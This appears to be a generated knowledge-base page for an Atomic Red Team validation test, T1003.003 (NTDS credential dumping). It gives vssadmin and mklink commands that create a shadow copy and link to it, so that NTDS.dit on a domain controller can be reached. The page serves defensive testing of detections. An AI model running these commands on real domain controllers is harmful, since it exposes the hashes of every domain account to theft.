---
atomic_guid: "21748c28-2793-4284-9e07-d6d028b66702"
title: "Create Symlink to Volume Shadow Copy"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.003"
attack_technique_name: "OS Credential Dumping: NTDS"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "21748c28-2793-4284-9e07-d6d028b66702"
  - "Create Symlink to Volume Shadow Copy"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Create Symlink to Volume Shadow Copy

This test is intended to be run on a domain Controller.

The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.

## Metadata

- Atomic GUID: 21748c28-2793-4284-9e07-d6d028b66702
- Technique: T1003.003: OS Credential Dumping: NTDS
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1003.003/T1003.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.003]]

## Input Arguments

### drive_letter

- description: Drive letter to source VSC (including colon)
- type: string
- default: C:

### symlink_path

- description: symlink path
- type: string
- default: C:\Temp\vssstore

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
vssadmin.exe create shadow /for=#{drive_letter}
mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml)
